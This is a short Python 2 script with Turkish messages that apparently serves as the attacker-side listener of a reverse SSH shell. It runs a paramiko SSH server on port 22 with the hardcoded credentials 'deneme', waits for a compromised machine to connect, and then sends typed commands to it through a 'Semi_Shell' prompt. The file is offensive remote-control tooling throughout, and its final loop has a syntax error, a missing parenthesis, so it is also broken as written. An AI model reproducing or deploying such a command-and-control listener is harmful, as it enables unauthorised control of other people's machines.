import socket
import sys
import threading
import paramiko

host_key = paramiko.RSAKey(filename='/root/Desktop/test_rsa.key')
class Server (paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'deneme') and (password == 'deneme'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
try:
    global sock
    sock= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('192.168.2.5',22))
    sock.listen(1)
    print '[+] Bağlantı dinleniyor...'

except Exception, e:
    print '[-] Bağlantı başarısız!' + str(e)

try:
    client, addr = sock.accept()
    print '[+] Bağlantı yakalandı o/ buradan:' + str(addr)
    t=paramiko.Transport(client)
    t.load_server_moduli()
    t.add_server_key(host_key)
    server = Server()
    t.start_server(server=server)
    global chan
    chan= t.accept(1)
    print chan.recv(1024)
    chan.send("Görülüyor.")

except:
    print "[-] Bağlantı bitirildi"
    pass 

while True:
    command=raw_input ("Semi_Shell>> "
    chan.send(command)
    print chan.recv(1024)
